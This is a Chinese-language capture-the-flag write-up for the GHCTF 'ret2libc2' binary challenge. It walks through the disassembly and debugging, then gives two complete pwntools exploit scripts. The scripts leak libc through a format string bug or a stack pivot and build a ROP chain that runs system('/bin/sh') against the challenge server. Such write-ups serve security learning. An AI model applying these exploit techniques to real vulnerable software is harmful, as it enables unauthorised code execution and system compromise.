---
title: ret2libc2
---
# GHCTF ret2libc2

## ida分析

### func函数分析
![6e5cf4e693a466433b60b2ca6baf7772.png](https://img.picui.cn/free/2025/03/09/67cd07aa94b2d.png)
1.程序很简单,main函数里只有init和func，这里直接看到func函数
2.可以看到存在一个格式化字符串漏洞和溢出漏洞.
3.程序没有提供system和`/bin/sh\x00`，需要泄露libc，完成ret2libc.

### func汇编分析
![98a456ad
.png](https://img.picui.cn/free/2025/03/09/67cd08b4567ca.png)
1.从汇编中可以看到更多信息.
2.首先是在leave ret 之前，lea rax [rbp+buf]. 实际上是将我们的输入的起始位置的内容交给了rax.而且可以注意到，无论是printf还是两个puts，都是通过rax来设置rdi。那么也就说我们的输入，可以给printf传递参数，也就是可以实现我们的格式化字符串漏洞.
3.同时，leave ret 留下了栈迁移的隐患。

### gdb调试分析
![65d.png](https://img.picui.cn/free/2025/03/09/67cd0bc176840.png)
1.通过gdb动调寻找栈上可以泄露出libc的函数.将func的返回地址覆盖为0x401227，直接将printf的rdi修改成我们的输入，查看这一帧栈帧，在0x15的位置看到了__libc_start_main,计算偏移为21+6=27.
2.同时，在第一次溢出时，需要覆盖rbp为有效地址。否则，这次func执行最后，会崩溃掉。

## 构造思路
1.首先确定泄露libc的手段，格式化字符串.并且第一次溢出时需要栈迁移.在这里补充一点，除了使用格式化字符串以外，还有一种泄露的手法.观察func函数，0x401223处，会将rbp-0x10 的内容作为参数赋给rax，再下方又被赋给了rdi.那么如果[rbp-0x10]是某个got表，那就可以把got表的内容打印出来。所以我们只需要把某个got-0x10交给rbp，就可以完成第一次的栈迁移和libc的泄露。
2.因为程序本身是没有提供pop_rdi,但是题目给了libc.so.6文件，在泄露libc基址之后，利用libc.so.6中的pop rdi;ret，一样可以控制rdi寄存器。现在我们已经有了ret2libc的全部条件。只需要栈迁移的一个合适的地址，完成rop。
3.选择bss段的高地址完成这段rop。如果是采用第二种方法泄露libc的话，需要再栈迁移一次，而且为了保证程序的顺利执行，第二次溢出，需要注意维护got表的内容尤其是read，否则第三次溢出就会出错。

## exp

### 格式化字符串
```python 
from pwn import *
context(os='linux',arch='amd64',log_level='debug')
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
io=process("./ret2libc2")
#libc=ELF("libc.so.6")
#io=remote("node2.anna.nssctf.cn",28626)
elf=ELF("./ret2libc2")
bss=0x404060
ret=0x4011fa
gdb.attach(io)

payload1=b'%27$p'.ljust(8,b'a')
payload1=payload1.ljust(0x30,b'a')+p64(bss+0x900)+p64(0x401227)
io.sendafter(b'show your magic\n',payload1)
start_addr=int(io.recv(14),16)-128
libc_base=start_addr-libc.symbols['__libc_start_main']
log.success("start_addr-{}".format(hex(start_addr)))
pop_rdi=libc_base+0x2a3e5
system=libc_base+libc.symbols['system']
binsh=libc_base+next(libc.search(b'/bin/sh'))
one=libc_base+0xebc85

payload2=b'a'*(0x38)+p64(pop_rdi)+p64(binsh)+p64(ret)+p64(system)
io.sendafter(b'show your magic\n',payload2)
io.interactive()
```

### 迁移泄露
```python
from pwn import *
from libcfind import *
from LibcSearcher import *
context(os='linux',arch='amd64',log_level='debug')
mode=1
url='node2.anna.nssctf.cn'
port=28268
elf=ELF("./ret2libc2")
libc=ELF("./libc.so.6")
if mode == 0:
    io=process("./ret2libc2")
else :
    io=remote(url,port)


#leave_ret=0x
puts_got=elf.got['puts']
puts_plt=elf.plt['puts']
complete=0x404070
func=0x40121f
magic=0x401252
bss=elf.bss()+0x500+0x500
rsp_8=0x401016
offset=0x30+8
payload=b'%13$s'.ljust(0x30,b'\x61')
payload+=p64(0x404038)
payload+=p64(func)
payload+=p64(puts_got)

#
io.sendafter("show your magic\n",payload)

read=u64(io.recv(6).ljust(8,b'\x00'))
log.success('read-{}'.format(hex(read)))

libc_base=read-libc.sym['read']
sys=libc_base+libc.sym['system']
puts=libc_base+libc.sym['puts']
printf=libc_base+libc.sym['printf']
setvbuf=libc_base+libc.sym['setvbuf']
bin_sh=libc_base+next(libc.search(b"/bin/sh\x00"))
pop_rdi=libc_base+0x2a3e5
ret=libc_base+0x29139

payload=p64(0)*2+p64(puts)+p64(printf)+p64(read)+p64(setvbuf)
payload+=p64(bss)+p64(magic)
io.sendafter("show your magic\n",payload)
#gdb.attach(io)
payload=offset * b'a'
payload+=p64(pop_rdi)
payload+=p64(bin_sh)
payload+=p64(ret)
payload+=p64(sys)
io.send(payload)

io.interactive()
```